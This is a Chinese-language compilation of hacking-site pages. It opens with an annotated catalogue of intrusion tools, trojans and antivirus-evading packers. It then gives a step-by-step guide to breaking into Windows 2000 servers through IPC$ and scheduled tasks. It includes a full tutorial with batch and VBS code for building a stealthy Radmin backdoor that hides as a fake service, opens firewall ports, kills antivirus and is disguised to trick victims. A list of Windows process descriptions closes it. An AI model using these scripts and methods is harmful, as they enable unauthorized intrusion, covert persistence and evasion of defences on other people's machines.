SkSockServer snake代理程序 

SMBCrack 是小榕为流光5开发的测试原型，和以往的SMB（共享）暴力破解工具不同，没有采用系统的API，而是使用了SMB的协议。Windows 2000可以在同一个会话内进行多次密码试探 ... 《入侵全攻略》 


socks 利用这工具安装木马，即使网关重新低格硬盘木马也在嘿嘿 * 

SocksCap 把socks5代理转化为万能代理 

SPC.zip 可以直接显示出远程win98共享资源密码的东东 * 

WMIhack 基于WMI服务进行账号密码的东东(不需要ipc) 

skmontor snake的注册表监视器（特酷的) 

sql1.exe mssql溢出程序2 

sql2.exe mssql溢出程序3 

SqlExec mssql客户端 

SuperScan GUI界面的优秀扫描器 

syn syn攻击第一高手 

upx120 特好的压缩软件，常用来压缩木马躲避杀毒软件 

wget 命令行下的http下载软件 

Win2kPass2 win2k的密码大盗 

Winnuke 攻击rpc服务的软件(win2ksp0/1/2/3+winnt+winxp系统不稳定) 

smbnuke 攻击netbios的软件(win2ksp0/1/2/3+winnt+winxp系统死机) 

WinPcap_2_3 nmap,arpsniffer等等都要用这个 

WinPcap_2_3_nogui.exe 无安装界面自动安装的WinPcap_2_3（命令行版) * 

scanbaby2.0 能对80%的mail服务利用漏洞列账号密码破解(超酷哦，去看rfc里有mail弱点说明) * 

SuperDic_V31 非常全面的黑客字典生成器 

Getadmin win2k+sp3配置的权限提升程序(不错!!!) * 

whoami 了理自己的权限 

FsSniffer 巨好的非交换机sniffer工具 

twwwscan 命令行下巨好的cgi扫描器 

TFTPD32 给远方开tftp服务的主机传文件(当然要有个shell) 

RangeScan 自定义cgi漏洞的GUI扫描器 

pwdump2 本地抓winnt/2k密码散列值(不可缺) 

pwdump3 远程抓winnt/2k密码散列值(不可缺) 

procexpnt 查看系统进程与端口关联(GUI界面) * 

nc 已经不是简单的telnet客户端了 

CMD.txt 有什么cmd命令不懂就查查它 * 

fport 命令行下查看系统进程与端口关联(没有GUI界面的procexpnt强) 

BrutusA2 全功能的密码破解软件,支持telnet,ftp,http等服务的口令破解 

cmd.reg 文件名自动补全的reg文件(命令行:按TAB键自动把sys补全为system,再按一次就变为system32) 

regshell 命令行下的注册表编辑器 

nscopy 备份员工具(当你是Backup Operators组的用户时有时你的权限会比admin还大) 

session.rar 有了win/nt2000目标主机的密码散列值,就可以直接发送散列值给主机而登录主机 * 

klogger.exe 一个几kb的击键记录工具,运行后会在当前目录生成KLOGGER.TXT文件 * 

smb2 发动smb的中间人MITM攻击的工具，在session中插入自己的执行命令 * 

xptsc.rar winxp的远程终端客户端(支持win2000/xp) 

SQLhack.zip 相当快的mssql密码暴力破解器 

mssql 相当快的mssql密码暴力破解器 

ntcrack.zip 利用获取到的MD4 passwd hash破解帐号密码 

SQLSniffer.rar MSsql的密码明文嗅探器 

TelnetHack.rar 在拥有管理员权限的条件下，远程打开WIN2000机器的Telnet服务 

RFPortXP.exe XP下关联端口与进程的程序 

SQLTools.rar mssql工具包 

ServiceApp.exe 远程安装/删除服务 

hgod 具有SYN/DrDos/UDP/ICMP/IGMP拒绝服务测试功能的选项 

hscan 小型综合扫描器(支持cisco,mysql,mssql,cgi,rpc,ipc(sid),ftp,ssh,smtp等等相当全面) 

HDoor.rar ping后门(icmp后门) 

SIDUserEnum.exe 利用sid得到用户列表(小榕的那个sid有时不能完全列举出来) * 

RPC_LE.exe 利用rpc溢出使win2k重启(对sp3+sp4hotfix有效) * 

r3389.exe 查询Terminal Server更改后的端口（1秒内） * 

smbsniffer.exe 获取访问本地主机网页的主机散列值(支持截获内网主机散列) * 

NetEnum.exe 通过3389端口+空连接获取对方主机大量信息 * 

aspcode.exe 经测试最有效的asp溢出程序第二版(对sp2有效) 

sslproxy 针对使用ssl加密协议的代理（扫描器通过它就可以扫描ssl主机了!!!!) * 

lsa2 在lsa注册表键里获取winnt/2k的明文密码包括sqlserver的(打了补丁就没用了) * 

psu.exe 用指定进程的权限打开指定的程序 

ldap.msi ldap 轻量级目录服务客户端,通过389端口获取主机大量信息如账号列表 * 

rootkit 从系统底层完美隐藏指定进程，服务，注册表I并可以端口绑定的内核级win2k后门!!! * 

Xscan 一款强大的扫描软件，可以和流光相媲美 采用多线程方式对指定IP地址段（或单机）进行安全漏洞检测，支持插件功能，提供了图形界面和命令行两种操作方式，扫描内容包括：远程操作系统类型及版本，标准端口状态及端口BANNER信息，SNMP信息，CGI漏洞，IIS漏洞，RPC漏洞，SQL-SERVER、FTP-SERVER、SMTP-SERVER、POP3-SERVER、NT-SERVER弱口令用户，NT服务器NETBIOS信息、注册表信息等。扫描结果保存在/log/目录中，index_*.htm为扫描结果索引文件。 增SSL插件，用于检测SSL漏洞；升级PORT、HTTP、IIS插件...（ 

x-way2.5 采用多线程形式对服务器系统进行漏洞扫描和安全测试工具，X-WAY多个版本均在Win2000下开发，建议用户使用时候也在Win2000环境，以发挥最佳效果...（中文版）《扫描工具，别忘了x-way2.5》 

SSS 俄罗斯出的，最好的扫描软件，还有分析，有漏洞描述，速度慢了点，它是我见地的最好的扫描软件！ 

NAMP 我一直用的是个这命令行的扫描软件，有win，LINUX版的，又快，又好，支持TCP,UDP,ICMP,安全扫描不会留下扫描日志！ 

下面的软件本来不想收进来给大家看，因为顶级黑客不入侵个人电脑，基本不用别人写的木马，肯定是人手一个（自己编写的木马） 
没有任何杀毒软件能查出来的。 
********************************************************************************************** 

使用木马改造工具： 
ASPack 这个是使用木马都一定要会用的工具，它能压缩木马，不让杀毒软件查出来！ 

UPX 非常好的可执行文件压缩软件，支持的格式包括 atari/tos，djgpp2/coff，dos/com，dos/exe，dos/sys，rtm32/pe，tmt/adam，watcom/le，win32/pe，Linux/i386 等等，压缩比率也非常的高 ... 
************************************************************************************** 
菜鸟级木马类： 
黑境 
近墨者 
魔法控制 
灰鸽子 
风雪 国产后门风雪，此版根据一些网友的建议，改进了几个功能，一个是可以配置是否自动共享C盘的功能，另一个是在查看菜单上加上了密码是否用*号来表示，同时修正了1.3版本在打开网址时按取消键仍会打开网址的BUG...（ 
网络神偷 一款远程控制软件，更新速度较快，可以访问局域网中的计算机，连接稳定上传下载速度快，但是会被很多杀毒厂商看成木马病毒追杀，要求使用者有自己的FTP空间 ... （中文版 
冰河 3 
广外男生 
广外女生 
Peep 
一套运用反端口技术的远程监控软体，运用此原理可以达到一般远程控制软体所无法达到之功能，例如可对区域网路及有架设防火墙的电脑作监控，被控端电脑将具有自动回传连线之功能，通讯埠可任意动态修改，及具有独立连线，也就是说除您本人其他人无法连线监控。其他的功能还有上线通知、连线速率调整、远端档案总管、远端桌面监控、 
远端进程管理、远端登录编辑、网页通报服务、DDoS攻击、还有被控端程式设置精灵、有常驻选择、文件捆绑及连线方式等选项...（中文版） 
木牛隐型版 运行后，服务器上硬盘C盘符共享（完全控制权限）开启ADMIN$、IPC$共享，开启TELNET服务，自动创建一个管理员权限帐号：IUSR_COMPUTER 密码：IUSR_COMPUTER...该版本自动修改注册表，重起后自动运行 
IE'en 通过IE远程控制的软件。它可以远程遥控IE动作，可以直接截取IE和任何服务器之间的数据通讯，你在IE中输入的用户名、密码等机密信息都在此列，它可以以纯文本方式存储或发送这些信息，一旦启动这一软件，远端被监控的浏览器窗口中进行的任何输入输出都会显示在本地IE'en中。运行ieen_s.exe（注：服务端）需要管理员权限 
盗密高手 监视被监视端（装了此程序的电脑）上QQ、邮箱等各种密码，并发送到您设置的邮箱 
***************************************************************************************** 

后记: 

以上的软件我都有，也基本都测试过，有了好的工具才能事半功倍，以上的软件中国顶级黑客使用的软件，都是这些。 
其实，主要还是自己编写的黑客软件用的多，只会用别的人工具，那不是顶级黑客 
%10的工具灵活应用+%30经验技术+%60的分析=一次较有深度的安全检测
 
 


【手把手教你入侵 win2000server 系统】
关于《经营性及非经营性ICP管理办法》的通告 |想要1000M空间吗？ | 举报此页（违法内容） 
 
  手把手教你入侵 win2000server 系统


手把手教你入侵 win2000server 系统
----------------------------------------
下载小榕流光4.7扫描存在空连接(ipc)漏洞主机
我们可以利用扫描时间.建立几种登入模式
1、3389
2、Telnet
3、Idq
----------------------------------------
1、3389入侵

在本地利用DOS命令edit建立.bat后缀批处理文件（文件名随意）

echo [Components] > c:\sql

echo TSEnable = on >>

c:\sqlsysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\sql /q

net use \\ip地址\ipc$ 密码 /user:用户名（一般默认:administrator)

利用at time 获取对方服务器时间。

copy 路径:\xxx.bat \\ip地址\$c:\winnt

at time 00:00:00 xxx.bat

服务器执行命令后，服务器将重新启动，利用3389登陆（登入器软件区有下载

2、Telnet入侵

在流光早期版本中含有srv.exe

net use \\ip地址\ipc$ 密码 /user:用户名（一般默认:administrator)

利用at time 获取对方服务器时间。

copy 路径:\srv.exe \\ip地址\$c:\winnt

at time 00:00:00 srv.exe

telnet \\ip地址 端口（默认99）

此时你想做什么就做什么吧。呵呵

   

 


【打造完美的远程控制软件Radmin】
打造完美的远程控制软件Radmin 

--------------------------------------------------------------------------------
www.hackbase.com 阅读:20148 时间:2006-4-1 7:13:25 来源:www.hackbase.com  
    大家好，关于如何打造出完美的Radmin服务端，网上有很多类似的修改后的程序，但有的服务名会暴露，有的会显示CMD窗口，我弥补了它们的缺点，综合了它们的优点，打造出了现在这个完美的Radmin服务端。  

准备工具  
Rock免杀工具； 
IcoSprite图标更改器； 
Killer15杀杀毒软件防火墙工具； 
SC.exe服务添加删除更改工具； 
AdmDll.dll、Raddrv.dll、R_server（这个不用说了吧，Radmin的服务端）。 

程序特点 
自解压形式，双击即可，自动解压到%systemroot%\system32\drivers\目录下，并能干掉卡巴斯基等杀毒软件。使用vbs嵌套bat来执行所有内容，不会跳出任何窗口。自建服务，并修改服务名、显示名、描述使其做到隐蔽。依存Windows Update服务，给试图关闭它带来困惑。做完一切后以只读，隐藏形式隐蔽Radmin服务端的三个程序，删除掉生成的一些REG、BAT、VBS文件，并能够突破Radmin外部连接进来时XP SP2防火墙的拦截。 

制作过程 
首先自己安装一下Radmin服务端，配置完密码，端口等信息后导出其在HKEY_LOCAL_MACHINE\SYSTEM\RAdmin的注册表文件，这里我另存为名Server.reg。然后要修改R_server.exe的图标并修改文件名为迷惑性文字如Update.exe，修改图标我用IcoSprite，觉得还不错。这样假如对方装有天网之类防火墙的话，可以骗过一些菜鸟，同意允许对外连接。 
接下来我们制作核心部分，最关键的BAT，重要的我将简单解释： 
@echo off  
@sc stop r_server 
‘假如已经被装过R_server服务，先用SC将它停掉。 
@sc delete r_server  
‘将已经装过R_server服务删除。 
@regedit /s server.reg 
@SC create MPservice BinPath= "%systemroot%\system32\drivers\Update.exe /service" type= own type= interact start= auto DisplayName= "Media Player of Remote 

Control Driver Update" 
‘这句是用SC建立一个服务，服务名为Mpservice，路径Binpath为"%systemroot%\system32\drivers\Update.exe /service"，类型type为 own 与interact交互，启动类型start为 自动，显示名DisplayName为"Media Player of Remote Control Driver Update"。 
@sc description MPservice "为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。" 
‘这句是将MPservice服务的描述改为“为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。”  
@sc config wuauserv depend= MPservice 
‘配置MPservice使wuauserv服务依存此服务（wuauserv可以根据自己喜欢改成其它服务，这里的wuauserv是系统在Windows Update 网站的自动更新服务）。这里的目的是迷惑管理员，使其不敢轻易停止我们生成的Radmin服务。 
@echo Windows Registry Editor Version 5.00 > %systemroot%\system32\drivers\DisFirewall.reg 
@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\

StandardProfile\GloballyOpenPorts\List] >> %systemroot%\system32\drivers\DisFirewall.reg 
‘这里添加成的一个DisFirewall.reg注册表文件，在对方是XP SP2系统的情况下将起到很大重要，由于SP2自带的防火墙配置信息是存放于注册表中的，所有完全可以通过写入自己想要的信息使你的R_server可以接受外界的连接。 
@echo "5151:TCP"="5151:TCP:*:Enabled:Windows Update Services">> stemroot%\system32\drivers\DisFirewall.reg 
‘这句是允许外部连接5151的TCP端口，设置防火墙此规则名为Windows Update Services。 
@regedit /s %systemroot%\system32\drivers\DisFirewall.reg 
@attrib +h +r %systemroot%\system32\drivers\Update.exe 
@attrib +h +r %systemroot%\system32\drivers\admdll.dll 
@attrib +h +r %systemroot%\system32\drivers\raddrv.dll 
‘以上三句是设置服务端三个文件为隐藏、只读属性。 
@sc start MPservice 
@del /q /f /s %systemroot%\system32\drivers\server.reg 
@del /q /f /s %systemroot%\system32\drivers\Update.vbs 
@del /q /f /s %systemroot%\system32\drivers\Update.bat 
@del /q /f /s %systemroot%\system32\drivers\sc.exe 
@del /q /f /s %systemroot%\system32\drivers\DisFirewall.reg 
‘以上是清理生成出来的杂物，加参数/q是以安静模式删除，不要求确认，参数/f是强制删除只读文件，参数/s是从所有子目录删除指定文件。 
接下来制作一个vbs文件，作用是令bat里的内容以安静模式执行，这样就可以让cmd窗口跳出来了，增加了不少隐蔽性。里面写上如下代码： 
On Error Resume Next 
set wshshell=createobject ("wscript.shell") 
a=wshshell.run ("Update.bat"，0) 
最后出场的是Killer15.exe这个东东，按它的说明书说是可以杀Norton AntiVirus、McAfee、个人计算机Cillin&KAV等。我用我的卡巴2006测试过，确实能被它杀掉。由于直接运行的话还没执行就被杀毒软件给干掉了，所以给它加个壳，这里用Rock免杀工具，经过它加的壳后逃过了我卡巴的大关，格式是：usage: rock [filename]。 
好了，整理一下：三个服务端文件+一个注册表信息，一个BAT，一个VBS，一个SC，一个Killer15，一共是8个文件，将它们打包制成自解压形式。勾选RAR里的“创建自解压格式压缩文件”，到高级里打开“自解压选项”，“解压路径”为%systemroot%\system32\drivers\，解压后运行“Update.vbs”，解压前运行“Killer15.new.exe”，模式里选“全部隐藏”跟“跳过已经存在文件”，文本和图标选项里“从文件加载自解压文件图标”里选一个迷惑性的ico图标做为自解压最后生成的图标。OK，一个自解压形式的Radmin服务端就这样生成了。假如你是靠欺骗别人双击执行的，你还可以自己添加个小游戏之类的进去，令它双击自解压的同时不会什么反映都没有，这里我就不再阐述了。 
最后感谢很多朋友对我的帮助，对于最后的服务端，假如大家有什么好的建议还请到黑防论坛赐教。
 


【提升asp权限】
cscript adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\System32\idq.dll" "C:\WINNT\System32\inetsrv\httpext.dll" "C:\WINNT\System32\inetsrv\httpodbc.dll" "C:\WINNT\System32\inetsrv\ssinc.dll" "C:\WINNT\System32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll"

c:\inetpub\adminscripts\adsutil.vbs

【操作系统进程描述】
操作系统进程描述

system process
进程文件: [system process] or [system process]
进程名称: Windows内存处理系统进程
描述: Windows页面内存管理进程，拥有0级优先。
是否为系统进程: 是 
alg.exe
进程文件: alg or alg.exe
进程名称: 应用层网关服务
描述: 这是一个应用层网关服务用于网络共享。
是否为系统进程: 是

csrss.exe
进程文件: csrss or csrss.exe
进程名称: Client/Server Runtime Server Subsystem
描述: 客户端服务子系统，用以控制Windows图形相关子系统。
是否为系统进程: 是

ddhelp.exe
进程文件: ddhelp or ddhelp.exe
进程名称: DirectDraw Helper
描述: DirectDraw Helper是DirectX这个用于图形服务的一个组成部分。
是否为系统进程: 是

dllhost.exe
进程文件: dllhost or dllhost.exe
进程名称: DCOM DLL Host进程
描述: DCOM DLL Host进程支持基于COM对象支持DLL以运行Windows程序。
是否为系统进程: 是

inetinfo.exe
进程文件: inetinfo or inetinfo.exe
进程名称: IIS Admin Service Helper
描述: InetInfo是Microsoft Internet Infomation Services (IIS)的一部分，用于Debug调试除错。
是否为系统进程: 是

internat.exe
进程文件: internat or internat.exe
进程名称: Input Locales
描述: 这个输入控制图标用于更改类似国家设置、键盘类型和日期格式。
是否为系统进程: 是

kernel32.dll
进程文件: kernel32 or kernel32.dll
进程名称: Windows壳进程
描述: Windows壳进程用于管理多线程、内存和资源。
是否为系统进程: 是

lsass.exe
进程文件: lsass or lsass.exe
进程名称: 本地安全权限服务
描述: 这个本地安全权限服务控制Windows安全机制。
是否为系统进程: 是

mdm.exe
进程文件: mdm or mdm.exe
进程名称: Machine Debug Manager
描述: Debug除错管理用于调试应用程序和Microsoft Office中的Microsoft Script Editor脚本编辑器。
是否为系统进程: 是

mmtask.tsk
进程文件: mmtask or mmtask.tsk
进程名称: 多媒体支持进程
描述: 这个Windows多媒体后台程序控制多媒体服务，例如MIDI。
是否为系统进程: 是

mprexe.exe
进程文件: mprexe or mprexe.exe
进程名称: Windows路由进程
描述: Windows路由进程包括向适当的网络部分发出网络请求。
是否为系统进程: 是

msgsrv32.exe
进程文件: msgsrv32 or msgsrv32.exe
进程名称: Windows信使服务
描述: Windows信使服务调用Windows驱动和程序管理在启动。 
是否为系统进程: 是

mstask.exe
进程文件: mstask or mstask.exe
进程名称: Windows计划任务
描述: Windows计划任务用于设定继承在什么时间或者什么日期备份或者运行。
是否为系统进程: 是

regsvc.exe
进程文件: regsvc or regsvc.exe
进程名称: 远程注册表服务
描述: 远程注册表服务用于访问在远程计算机的注册表。
是否为系统进程: 是

rpcss.exe
进程文件: rpcss or rpcss.exe
进程名称: RPC Portmapper
描述: Windows 的RPC端口映射进程处理RPC调用(远程模块调用)然后把它们映射给指定的服务提供者。
是否为系统进程: 是

services.exe
进程文件: services or services.exe
进程名称: Windows Service Controller
描述: 管理Windows服务。
是否为系统进程: 是

smss.exe
进程文件: smss or smss.exe
进程名称: Session Manager Subsystem
描述: 该进程为会话管理子系统用以初始化系统变量，MS-DOS驱动名称类似LPT1以及COM，调用Win32壳子系统和运行在Windows登陆过程。
是否为系统进程: 是

snmp.exe
进程文件: snmp or snmp.exe
进程名称: Microsoft SNMP Agent
描述: Windows简单的网络协议代理（SNMP）用于监听和发送请求到适当的网络部分。
是否为系统进程: 是

spool32.exe
进程文件: spool32 or spool32.exe
进程名称: Printer Spooler
描述: Windows打印任务控制程序，用以打印机就绪。
是否为系统进程: 是

spoolsv.exe
进程文件: spoolsv or spoolsv.exe
进程名称: Printer Spooler Service
描述: Windows打印任务控制程序，用以打印机就绪。
是否为系统进程: 是

stisvc.exe
进程文件: stisvc or stisvc.exe
进程名称: Still Image Service
描述: Still Image Service用于控制扫描仪和数码相机连接在Windows。
是否为系统进程: 是

svchost.exe
进程文件: svchost or svchost.exe
进程名称: Service Host Process
描述: Service Host Process是一个标准的动态连接库主机处理服务。
是否为系统进程: 是

system
进程文件: system or system
进程名称: Windows System Process
描述: Microsoft Windows系统进程。
是否为系统进程: 是

taskmon.exe
进程文件: taskmon or taskmon.exe
进程名称: Windows Task Optimizer
描述: windows任务优化器监视你使用某个程序的频率，并且通过加载那些经常使用的程序来整理优化硬盘。 
是否为系统进程: 是

tcpsvcs.exe
进程文件: tcpsvcs or tcpsvcs.exe
进程名称: TCP/IP Services
描述: TCP/IP Services Application支持透过TCP/IP连接局域网和Internet。
是否为系统进程: 是

winlogon.exe
进程文件: winlogon or winlogon.exe
进程名称: Windows Logon Process
描述: Windows NT用户登陆程序。
是否为系统进程: 是

winmgmt.exe
进程文件: winmgmt or winmgmt.exe
进程名称: Windows Management Service
描述: Windows Management Service透过Windows Management Instrumentation data (WMI)技术处理来自应用客户端的请求。
是否为系统进程: 是

程序进程

absr.exe
进程文件: absr or absr.exe
进程名称: Backdoor.Autoupder Virus
描述: 这个进程是Backdoor.Autoupder后门病毒程序创建的。
是否为系统进程: 否

acrobat.exe
进程文件: acrobat or acrobat.exe
进程名称: Adobe Acrobat
描述: Acrobat Writer用于创建PDF文档。
是否为系统进程: 否

acrord32.exe
进程文件: acrord32 or acrord32.exe
进程名称: Acrobat Reader
描述: Acrobat Reader是一个用于阅读PDF文档的软件。
是否为系统进程: 否

agentsvr.exe
进程文件: agentsvr or agentsvr.exe
进程名称: OLE automation server
描述: OLE Automation Server是Microsoft Agent的一部分。
是否为系统进程: 否

aim.exe
进程文件: aim or aim.exe
进程名称: AOL Instant Messenger
描述: AOL Instant Messenger是一个在线聊天和即时通讯IM软件客户端。
是否为系统进程: 否

airsvcu.exe
进程文件: airsvcu or airsvcu.exe
进程名称: Microsoft Media Manager
描述: OLE 这是一个用于在硬盘上建立索引文件和文件夹，在Microsoft Media Manager媒体管理启动时运行的进程。它可以在控制面板被禁用。
是否为系统进程: 否

alogserv.exe
进程文件: alogserv or alogserv.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用于扫描你的文档和E-mail中的病毒。
是否为系统进程: 否

avconsol.exe
进程文件: avconsol or avconsol.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用于扫描你的文档和E-mail中的病毒。
是否为系统进程: 否

avsynmgr.exe
进程文件: avsynmgr or avsynmgr.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用于扫描你的文档和E-mail中的病毒。
是否为系统进程: 否

backWeb.exe
进程文件: backWeb or backWeb.exe
进程名称: Backweb Adware
描述: Backweb是一个Adware（广告插件，一般是由于安装某些免费软件而伴随安装上的程序）来自Backweb Technologies。
是否为系统进程: 否


bcb.exe
进程文件: bcb or bcb.exe
进程名称: Borland C++ Builder
描述: Borland C++ Builder
是否为系统进程: 否

calc.exe
进程文件: calc or calc.exe
进程名称: Calculator
描述: Microsoft Windows计算器程序
是否为系统进程: 否

ccapp.exe
进程文件: ccapp or ccapp.exe
进程名称: Symantec Common Client
描述: Symantec公用应用客户端包含在Norton AntiVirus 2003和Norton Personal Firewall 2003。
是否为系统进程: 否

cdplayer.exe
进程文件: cdplayer or cdplayer.exe
进程名称: CD Player
描述: Microsoft Windows包含的CD播放器
是否为系统进程: 否

charmap.exe
进程文件: charmap or charmap.exe
进程名称: Windows Character Map
描述: Windows字符映射表用来帮助你寻找不常见的字符。
是否为系统进程: 否

idaemon.exe
进程文件: cidaemon or cidaemon.exe
进程名称: Microsoft Indexing Service
描述: 在后台运行的Windows索引服务，用于帮助你搜索文件在下次变得更快。
是否为系统进程: 

cisvc.exe
进程文件: cisvc or cisvc.exe
进程名称: Microsoft Index Service Helper
描述: Microsoft Index Service Helper监视Microsoft Indexing Service (cidaemon.exe) 的内存占用情况，如果cidaemon.exe内存使用超过了40M，则自动重新启动该进程。
是否为系统进程: 否

cmd.exe
进程文件: cmd or cmd.exe
进程名称: Windows Command Prompt
描述: Windows控制台程序。不像旧的command.com，cmd.exe是一个32位的命令行使用在WinNT/2000/XP。
是否为系统进程: 否

cmesys.exe
进程文件: cmesys or cmesys.exe
进程名称: Gator GAIN Adware
描述: Gator GAIN是一个Adware插件（广告插件，一般是由于安装某些免费软件而伴随安装上的程序）。
是否为系统进程: 否

ctfmon.exe
进程文件: ctfmon or ctfmon.exe
进程名称: Alternative User Input Services
描述: 控制Alternative User Input Text Processor (TIP)和Microsoft Office语言条。Ctfmon.exe提供语音识别、手写识别、键盘、翻译和其它用户输入技术的支持。
是否为系统进程: 否

ctsvccda.exe
进程文件: ctsvccda or ctsvccda.exe
进程名称: Create CD-ROM Services
描述: 在Win9X创建CD-ROM访问服务。
是否为系统进程: 否

cutftp.exe
进程文件: cutftp or cutftp.exe
进程名称: CuteFTP
描述: CuteFTP是一个流行的FTP客户端用于从FTP服务器上传/下载文件。
是否为系统进程: 否

defwatch.exe
进程文件: defwatch or defwatch.exe
进程名称: Norton AntiVirus
描述: Norton Anti-Virus扫描你的文件和email以检查病毒。
是否为系统进程: 否

devldr32.exe
进程文件: devldr32 or devldr32.exe
进程名称: Create Device Loader
描述: Creative Device Loader属于Create Soundblaster驱动。
是否为系统进程: 否

directcd.exe
进程文件: directcd or directcd.exe
进程名称: Adaptec DirectCD
描述: Adaptec DirectCD是一个用文件管理器式的界面，烧录文件到光盘的软件。
是否为系统进程: 否

dreamweaver.exe
进程文件: dreamweaver or dreamweaver.exe
进程名称: Macromedia DreamWeaver
描述: Macromedia DreamWeaver是一个HTML编辑器用于创建站点和其它类别的HTML文档。
是否为系统进程: 否

em_exec.exe
进程文件: em_exec or em_exec.exe
进程名称: Logitech Mouse Settings
描述: 这是Logitech MouseWare状态栏图标的进程，用于用户访问控制鼠标属性和察看MouseWare帮助。 
是否为系统进程: 否

excel.exe
进程文件: excel or excel.exe
进程名称: Microsoft Excel
描述: Microsoft Excel是一个电子表格程序包括在Microsoft Office中。 
是否为系统进程: 否

findfast.exe
进程文件: findfast or findfast.exe
进程名称: Microsoft Office Indexing
描述: Microsoft Office索引程序，用于提高Microsoft Office索引Office文档的速度。 
是否为系统进程: 否

frontpage.exe
进程文件: frontpage or frontpage.exe
进程名称: Microsoft FrontPage
描述: Microsoft FrontPage是一个HTML编辑器用于创建站点和其它类别的HTML文档。 
是否为系统进程: 否

gmt.exe
进程文件: gmt or gmt.exe
进程名称: Gator Spyware Component
描述: Gator Spyware是一个广告插件，随Gator安装和启动。 
是否为系统进程: 否


hh.exe
进程文件: hh or hh.exe
进程名称: Gator Windows Help
描述: Windows Help程序用以打开帮助文件和文档，包括在很多Windows程序中。 
是否为系统进程: 否

hidserv.exe
进程文件: hidserv or hidserv.exe
进程名称: Microsoft Human Interface Device Audio Service
描述: 后台服务，用来支持USB音效部件和USB多媒体键盘。 
是否为系统进程: 否

QQ.exe
进程文件: QQ or QQ.exe
进程名称: QQ
描述: QQ是一个在线聊天和即时通讯客户端。
是否为系统进程: 否

iexplore.exe
进程文件: iexplore or iexplore.exe
进程名称: Internet Explorer
描述: Microsoft Internet Explorer网络浏览器透过HTTP访问WWW万维网。
是否为系统进程: 否

kodakimage.exe
进程文件: kodakimage or kodakimage.exe
进程名称: Imaging
描述: Kodak Imaging是一个图片察看软件。包括在Windows，用以打开图像文件。
是否为系统进程: 否

loadqm.exe
进程文件: loadqm or loadqm.exe
进程名称: MSN Queue Manager Loader
描述: MSN Queue Manager Loader被随着MSN Explorer和MSN Messenger安装。他在一些时候会占用很多系统资源。
是否为系统进程: 否

loadwc.exe
进程文件: loadwc or loadwc.exe
进程名称: Load WebCheck
描述: Load WebCheck用以定制一些Internet Explorer的设定，添加、删除或者更新用户profiles设定。
是否为系统进程: 否

mad.exe
进程文件: mad or mad.exe
进程名称: System Attendant Service
描述: System Attendant Service是Microsoft Exchange Server的后台程序。它用以读取Microsoft Exchange的DLLs文件，写log信息和生成离线地址薄。
是否为系统进程: 否

mcshield.exe
进程文件: mcshield or mcshield.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用以扫描你的文件和email中的病毒。
是否为系统进程: 否

mgabg.exe
进程文件: mgabg or mgabg.exe
进程名称: Matrox BIOS Guard
描述: Matrox BIOS守护进程。
是否为系统进程: 否

mmc.exe
进程文件: mmmc or mmc.exe
进程名称: Microsoft Management Console
描述: Microsoft Management Console管理控制程序集成了很多的系统控制选项。例如设备管理（系统、硬件 
）或者计算机权限控制（Administrative管理工具）。
是否为系统进程: 否

mobsync.exe
进程文件: mobsync or mobsync.exe
进程名称: Microsoft Synchronization Manager
描述: Internet Explorer的一个组成部分，用以在后台同步离线察看页面。
是否为系统进程: 否

mplayer.exe
进程文件: mplayer or mplayer.exe
进程名称: Windows Media Player
描述: Windows Media Player是一个用以打开音乐、声音和视频文件的软件。
是否为系统进程: 否

mplayer2.exe
进程文件: mplayer2 or mplayer2.exe
进程名称: Windows Media Player
描述: Windows Media Player是一个用以打开音乐、声音和视频文件的软件。
是否为系统进程: 否

msaccess.exe
进程文件: msaccess or msaccess.exe
进程名称: Microsoft Access
描述: Microsoft Access是一个数据库软件包括在Microsoft Office。
是否为系统进程: 否

msbb.exe
进程文件: msbb or msbb.exe
进程名称: MSBB Web3000 Spyware Application
描述: MSBB Web3000 Spyware是包括在一些adware产品中，利用注册表随Windows启动。
是否为系统进程: 否

msdtc.exe
进程文件: msdtc or msdtc.exe
进程名称: Distributed Transaction Coordinator
描述: Microsoft Distributed Transaction Coordinator控制多个服务器的传输，被安装在Microsoft Personal Web Server和Microsoft SQL Server。
是否为系统进程: 否

msiexec.exe
进程文件: msiexec or msiexec.exe
进程名称: Windows Installer Component
描述: Windows Installer的一部分。用来帮助Windows Installer package files (MSI)格式的安装文件。
是否为系统进程: 否

msimn.exe
进程文件: msimn or msimn.exe
进程名称: Microsoft Outlook Express
描述: Microsoft Outlook Express是一个Email和新闻组客户端包括在Microsoft Windows。
是否为系统进程: 否


msmsgs.exe
进程文件: msmsgs or msmsgs.exe
进程名称: MSN Messenger Traybar Process
描述: MSN Messenger是一个在线聊天和即时通讯客户端。
是否为系统进程: 否

msoobe.exe
进程文件: msoobe or msoobe.exe
进程名称: Windows Product Activation
描述: Windows XP License的Product Activation产品激活程序。
是否为系统进程: 否

mspaint.exe
进程文件: mspaint or mspaint.exe
进程名称: Microsoft Paint
描述: Microsoft Paint画图是一个图像编辑器包括在Microsoft Windows，它能够编辑bmp图像。 
是否为系统进程: 否

mspmspsv.exe
进程文件: mspmspsv or mspmspsv.exe
进程名称: WMDM PMSP Service
描述: Windows Media Player 7需要安装的Helper Service。 
是否为系统进程: 否

mysqld-nt.exe
进程文件: mysqld-nt or mysqld-nt.exe
进程名称: MySQL Daemon
描述: MySQL Daemon控制访问MySQL数据库。 
是否为系统进程: 否

navapsvc.exe
进程文件: navapsvc or navapsvc.exe
进程名称: Norton AntiVirus Auto-Protect Service
描述: Norton Anti-Virus扫描你的文件和email中的病毒。 
是否为系统进程: 否

navapw32.exe
进程文件: navapw32 or navapw32.exe
进程名称: Norton AntiVirus Agent
描述: Norton Anti-Virus扫描你的文件和email中的病毒。 
是否为系统进程: 否

ndetect.exe
进程文件: ndetect or ndetect.exe
进程名称: ICQ Ndetect Agent
描述: ICQ Ndetect Agent是ICQ用来侦测网络连接的程序。 
是否为系统进程: 否

netscape.exe
进程文件: netscape or netscape.exe
进程名称: Netscape
描述: Netscape网络浏览器通过HTTP浏览WWW万维网。 
